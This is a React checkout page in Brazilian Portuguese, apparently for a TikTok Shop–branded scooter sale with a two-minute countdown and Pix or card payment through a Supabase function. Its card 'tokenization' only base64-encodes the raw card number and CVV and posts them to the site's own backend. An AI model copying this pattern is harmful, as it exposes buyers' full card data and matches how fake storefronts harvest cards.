import { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Badge } from '@/components/ui/badge';
import { Separator } from '@/components/ui/separator';
import { Gift, Zap, Truck, RotateCcw, Lock, CreditCard } from 'lucide-react';
import { RadioGroup, RadioGroupItem } from '@/components/ui/radio-group';
import { useToast } from '@/hooks/use-toast';
import { supabase } from '@/integrations/supabase/client';
import tiktokShopIcon from '@/assets/tiktok-shop-icon.webp';
import scooterProduct from '@/assets/scooter-product.webp';

const Checkout = () => {
  const { toast } = useToast();
  const [timeLeft, setTimeLeft] = useState(120000); // 2 minutes in milliseconds
  const [selectedPayment, setSelectedPayment] = useState('Pix');
  const [cepLoading, setCepLoading] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  // NOVO ESTADO: Para capturar e exibir erros específicos de CPF ou da API ExpfyPay
  const [apiError, setApiError] = useState<{ field: string, message: string } | null>(null);
  const [cardData, setCardData] = useState({
    number: '',
    holderName: '',
    expiration: '',
    cvv: ''
  });

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 0) return 0;
        return prev - 1000;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const formatTime = (ms: number) => {
    const minutes = Math.floor(ms / 60000);
    const seconds = Math.floor((ms % 60000) / 1000);
    return `${minutes}:${seconds.toString().padStart(2, '0')}`;
  };

  const fillAddress = async (cep: string) => {
    // Remove any non-numeric characters
    const cleanCep = cep.replace(/\D/g, '');
    
    // Validate CEP length
    if (cleanCep.length !== 8) {
      return;
    }

    setCepLoading(true);
    
    try {
      const response = await fetch(`https://viacep.com.br/ws/${cleanCep}/json/`);
      const data = await response.json();
      
      if (data.erro) {
        toast({
          title: "CEP não encontrado",
          description: "Por favor, verifique o CEP digitado.",
          variant: "destructive",
        });
        // Clear address fields
        (document.getElementById('address') as HTMLInputElement).value = '';
        (document.getElementById('neighborhood') as HTMLInputElement).value = '';
        (document.getElementById('city') as HTMLInputElement).value = '';
        (document.getElementById('state') as HTMLInputElement).value = '';
        return;
      }
      
      // Fill address fields
      (document.getElementById('address') as HTMLInputElement).value = data.logradouro || '';
      (document.getElementById('neighborhood') as HTMLInputElement).value = data.bairro || '';
      (document.getElementById('city') as HTMLInputElement).value = data.localidade || '';
      (document.getElementById('state') as HTMLInputElement).value = data.uf || '';
      
      // Focus on number field
      document.getElementById('number')?.focus();
      
      toast({
        title: "Endereço encontrado!",
        description: "Os campos foram preenchidos automaticamente.",
      });
    } catch (error) {
      toast({
        title: "Erro ao buscar CEP",
        description: "Não foi possível buscar o endereço. Tente novamente.",
        variant: "destructive",
      });
    } finally {
      setCepLoading(false);
    }
  };

  const formatCardNumber = (value: string) => {
    const cleaned = value.replace(/\D/g, '');
    const formatted = cleaned.match(/.{1,4}/g)?.join(' ') || cleaned;
    return formatted.substring(0, 19); // 16 digits + 3 spaces
  };

  const formatExpiration = (value: string) => {
    const cleaned = value.replace(/\D/g, '');
    if (cleaned.length >= 2) {
      return cleaned.substring(0, 2) + '/' + cleaned.substring(2, 4);
    }
    return cleaned;
  };

  const formatCPF = (value: string) => {
    const cleaned = value.replace(/\D/g, '');
    if (cleaned.length <= 11) {
      return cleaned
        .replace(/(\d{3})(\d)/, '$1.$2')
        .replace(/(\d{3})(\d)/, '$1.$2')
        .replace(/(\d{3})(\d{1,2})$/, '$1-$2');
    }
    return value;
  };

  const validateEmail = (email: string) => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
  };

  const validateCPF = (cpf: string) => {
    const cleaned = cpf.replace(/\D/g, '');
    return cleaned.length === 11;
  };

  const handleCardInputChange = (field: string, value: string) => {
    let formattedValue = value;
    
    if (field === 'number') {
      formattedValue = formatCardNumber(value);
    } else if (field === 'expiration') {
      formattedValue = formatExpiration(value);
    } else if (field === 'cvv') {
      formattedValue = value.replace(/\D/g, '').substring(0, 4);
    }
    
    setCardData(prev => ({ ...prev, [field]: formattedValue }));
  };

  const processPayment = async () => {
    setIsProcessing(true);
    setApiError(null); // Limpa qualquer erro de API anterior

    
    try {
      // Validate required fields
      const name = (document.getElementById('name') as HTMLInputElement)?.value;
      const email = (document.getElementById('email') as HTMLInputElement)?.value;
      const phone = (document.getElementById('phone') as HTMLInputElement)?.value;
      const cpf = (document.getElementById('cpf') as HTMLInputElement)?.value;

      if (!name || !email || !phone || !cpf) {
        toast({
          title: "Campos obrigatórios",
          description: "Por favor, preencha todos os dados de identificação.",
          variant: "destructive",
        });
        setIsProcessing(false);
        return;
      }

      // Validate email format
      if (!validateEmail(email)) {
        toast({
          title: "Email inválido",
          description: "Por favor, digite um email válido.",
          variant: "destructive",
        });
        setIsProcessing(false);
        return;
      }

      // Validate CPF format (11 digits)
      if (!validateCPF(cpf)) {
        toast({
          title: "CPF inválido",
          description: "Por favor, digite um CPF válido com 11 dígitos.",
          variant: "destructive",
        });
        setIsProcessing(false);
        return;
      }

      // Clean CPF (remove formatting) before sending to backend
      const cleanedCPF = cpf.replace(/\D/g, '');

      const customerData = { 
        name: name.trim(), 
        email: email.trim(), 
        phone: phone.replace(/\D/g, ''), 
        cpf: cleanedCPF 
      };
      const amount = selectedPayment === 'Pix' ? 63.15 : 67.90;

      if (selectedPayment === 'Cartao') {
        // Validate card fields
        if (!cardData.number || !cardData.holderName || !cardData.expiration || !cardData.cvv) {
          toast({
            title: "Dados do cartão incompletos",
            description: "Por favor, preencha todos os dados do cartão.",
            variant: "destructive",
          });
          setIsProcessing(false);
          return;
        }

        // Tokenize card with Amplopay (simulated)
        const cardToken = btoa(JSON.stringify({
          number: cardData.number.replace(/\s/g, ''),
          holderName: cardData.holderName,
          expiration: cardData.expiration,
          cvv: cardData.cvv
        }));

        // Process card payment
        const { data, error } = await supabase.functions.invoke('process-payment', {
          body: {
            paymentMethod: 'CARD',
            amount,
            cardToken,
            customerData
          }
        });

        if (error) throw error;
        
        // CORREÇÃO: Trata a resposta da Edge Function
        if (data && data.error) {
            // Se a Edge Function retornou um erro específico (ex: da ExpfyPay)
            throw new Error(data.error); 
        }

        if (data.success) {
          toast({
            title: "Pagamento aprovado!",
            description: `Transação: ${data.transactionId}`,
          });
        } else {
          throw new Error("Erro desconhecido ao processar Cartão.");
        }
      } else {
        // Process Pix payment
        const { data, error } = await supabase.functions.invoke('process-payment', {
          body: {
            paymentMethod: 'PIX',
            amount,
            customerData
          }
        });

        if (error) throw error;

        // CORREÇÃO: Trata a resposta da Edge Function (Pix)
        if (data && data.error) {
            // Se a Edge Function retornou um erro específico (ex: da ExpfyPay ou CPF inválido)
            throw new Error(data.error); 
        }

        if (data.success) {
          toast({
            title: "Pix gerado com sucesso!",
            description: "Use o código abaixo para realizar o pagamento.",
          });
          // Here you would display the Pix QR code and copy-paste code
          console.log('Pix Data:', data.paymentData);
        } else {
          throw new Error("Erro desconhecido ao gerar Pix.");
        }
      }
    // CORREÇÃO: O bloco catch agora trata erros detalhados.
    } catch (error) {
      console.error('Payment error:', error);
      
      const errorMessage = error instanceof Error ? error.message : "Erro desconhecido";
      
      // Se a mensagem de erro contiver a palavra "CPF" (vinda da Edge Function ou da validação interna)
      if (errorMessage.toLowerCase().includes('cpf')) {
          setApiError({ field: 'cpf', message: errorMessage });
      }
      
      toast({
        title: "Erro no pagamento",
        description: errorMessage, // Exibe a mensagem de erro detalhada da API/Back-end
        variant: "destructive",
      });
    } finally {
      setIsProcessing(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#f9f9fa]">
      {/* Header */}
      {/* ... (código do header omitido para brevidade) ... */}

      {/* Advice Bar */}
      {/* ... (código da advice bar omitido para brevidade) ... */}

      <div className="container mx-auto px-4 py-6 max-w-4xl">
        {/* Progress Steps */}
        {/* ... (código das etapas omitido para brevidade) ... */}

        {/* Timer */}
        {/* ... (código do timer omitido para brevidade) ... */}

        {/* Product Info */}
        {/* ... (código do produto omitido para brevidade) ... */}

        {/* Priority Benefits */}
        {/* ... (código dos benefícios omitido para brevidade) ... */}

        {/* Payment Form */}
        <div className="bg-white rounded-lg p-6 shadow-sm mb-6">
          <h2 className="text-xl font-bold mb-4">Identificação</h2>
          
          <div className="space-y-4 mb-6">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <Label htmlFor="name">Nome completo</Label>
                <Input id="name" placeholder="Digite seu nome completo" />
              </div>
              <div>
                <Label htmlFor="email">E-mail</Label>
                <Input id="email" type="email" placeholder="seu@email.com" />
              </div>
            </div>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <Label htmlFor="phone">Telefone/WhatsApp</Label>
                <Input id="phone" placeholder="(21) 99999-9999" />
              </div>
              <div>
                <Label htmlFor="cpf" className={apiError?.field === 'cpf' ? 'text-red-500' : ''}>CPF</Label>
                <Input 
                  id="cpf" 
                  placeholder="000.000.000-00"
                  maxLength={14}
                    className={apiError?.field === 'cpf' ? 'border-red-500 focus:border-red-500' : ''}
                  onChange={(e) => {
                    e.target.value = formatCPF(e.target.value);
                        setApiError(null); // Limpa o erro ao digitar
                  }}
                />
                {apiError?.field === 'cpf' && (
                    <p className="text-red-500 text-sm mt-1 font-medium">{apiError.message}</p>
                )}
              </div>
            </div>
          </div>

          <Separator className="my-6" />

          {/* Endereço de Entrega */}
          {/* ... (código do endereço omitido para brevidade) ... */}
          
          <Separator className="my-6" />

          <h2 className="text-xl font-bold mb-4">Forma de Pagamento</h2>
          
          {/* RadioGroup e Campos de Cartão */}
          {/* ... (código do pagamento omitido para brevidade) ... */}

        </div>

        {/* Order Summary */}
        {/* ... (código do resumo omitido para brevidade) ... */}

        {/* Submit Button */}
        <Button 
          className="w-full h-14 text-lg font-bold uppercase"
          style={{ backgroundColor: '#F72E54' }}
          onClick={processPayment}
          disabled={isProcessing}
        >
          {isProcessing ? 'Processando...' : 'Finalizar Compra'}
        </Button>

        {/* Security Info */}
        {/* ... (código da segurança omitido para brevidade) ... */}
      </div>

        {/* Footer */}
      {/* ... (código do footer omitido para brevidade) ... */}
    </div>
  );
};

export default Checkout;
